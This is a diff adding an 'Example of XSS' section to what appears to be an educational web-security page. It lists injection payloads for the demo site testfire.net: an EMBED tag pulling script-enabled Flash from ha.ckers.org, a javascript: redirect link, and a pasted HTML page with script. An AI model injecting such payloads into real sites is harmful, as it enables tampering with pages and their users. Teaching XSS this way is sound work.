@@ -25,6 +25,31 @@
 		})
 	</script>
 </head>
+<style>
+.testlink {
+  color: green;
+  background-color: transparent;
+  text-decoration: none;
+}
+
+.testlink:visited {
+  color: rgb(185, 26, 26);
+  background-color: transparent;
+  text-decoration: none;
+}
+
+.testlink:hover {
+  color: blue;
+  background-color: transparent;
+  text-decoration: underline;
+}
+
+.testlink:active {
+  color: rgb(233, 34, 150);
+  background-color: transparent;
+  text-decoration: underline;
+}
+</style>
 <body>
 
 <!-- Navigation Bar -->
@@ -125,6 +150,97 @@
             it is difficult for the average user to detect XSS attacks.    
         </p>
         <br>
+        <h2 id="before">Example of XSS</h2>
+        <p>
+            The XSS cross site scripting is used for the vulnerability test. Using the OWASP 
+            (Open Web Application Security projects) the below attacks can be made. Let's discuss few basic XSS attacks that 
+            can be made in vulnerable websites. <br><br>
+            <a href="http://testfire.net/" class="testlink" target="_blank"> www.testfire.net</a>   This website is an open source website to perform web based attack.
+            <br><br>
+           
+            <strong>1. To show any image icon in the web page</strong>
+            <p style="background-color: rgb(232, 232, 236); width: fit-content; margin: 20px; padding: 15px; border-radius: 4px;">
+             &lt;EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"&gt;&lt;/EMBED&gt;
+            </p>
+            <br>
+        </p>
+        </p>
+        <img src="images/extra/xss1.png" style="padding-left:25px; padding-top: 25px;width: 1000px;">    
+        </p><br><br>
+        <p>
+            <strong>2. To Excecute a link in web page</strong>
+            <p style="background-color: rgb(232, 232, 236); width: fit-content; margin: 20px; padding: 15px; border-radius: 4px;">
+             &lt;A HREF="javascript:document.location='http://www.google.com/'"&gt;XSS&lt;/A&gt;
+            </p>
+            <br><br>
+        </p>
+        </p>
+        <img src="images/extra/xss2.png" style="padding-left:25px; padding-top: 25px; width: 1000px;">    
+        </p>
+        <br>
+        <p>
+            <strong>3. To Change the page color by adding a submit button and a form in web page</strong>
+            <p style="background-color: rgb(232, 232, 236); width: fit-content; margin: 20px; padding: 15px; border-radius: 4px;">
+                &lt;!DOCTYPE HTML&gt;<br>
+                &lt;html&gt;<br>
+                &lt;head&gt;<br>
+                    &lt;title&gt;<br>
+                        How to change the background color
+                        after clicking the button ?
+                    &lt;/title&gt;<br>
+                &lt;/head&gt;<br>
+                
+                &lt;body style="text-align:center;"&gt;<br>
+                
+                    &lt;h1 style="color:green;"&gt;<br>
+                        GeeksforGeeks
+                    &lt;/h1&gt;<br>
+                    &lt;p id="GFG_UP" style="font-size: 16px;
+                                        font-weight: bold;"&gt;<br>
+                    &lt;/p&gt;<br>
+                
+                    &lt;button onclick="gfg_Run()"&gt;<br>
+                        Click here
+                    &lt;/button&gt;<br>
+                
+                    &lt;p id="GFG_DOWN" style="color:green;
+                                            font-size: 20px;
+                                            font-weight: bold;"&gt;<br>
+                    &lt;/p&gt;<br>
+                    &lt;script&gt;<br>
+                        let el_up = document.getElementById("GFG_UP");<br>
+                        let el_down = document.getElementById("GFG_DOWN");<br>
+                        let str = "Click on button to change the background color";<br>		
+                        el_up.innerHTML = str;	<br>
+                        function changeColor(color) {<br>
+                            document.body.style.background = color;<br>
+                        }<br>
+                        function gfg_Run() {<br>
+                            changeColor('#BB8FCE');<br>
+                            el_down.innerHTML = "Background Color changed";<br>
+                        }	<br>
+                    &lt;/script&gt;<br>
+                &lt;/body&gt;<br>
+                &lt;/html&gt;<br>
+                
+            </p>
+        </p>
+        <img src="images/extra/xss3.png" style="padding-left:25px; padding-top: 25px; width: 1000px;">    
+        </p>
+        <p>Once the script is inserted in the search bar, the <strong>button</strong> will display in the main screen. 
+            After clicking the button the background color of the web page changes. If a website is vulnerable in scripting, 
+            the intruder can use these cross site scripting to access the webpage or do the necessary modification. 
+            Just by inserting these scripts in the searchbar of the web page. </p>
+        </p>
+        <img src="images/extra/xss4.png" style="padding-left:25px; padding-top: 25px; width: 1000px;">    
+        </p>
+
+
+            <br><br>
+        </p>
+
+        </p>
+
     </div>
 
 </section>
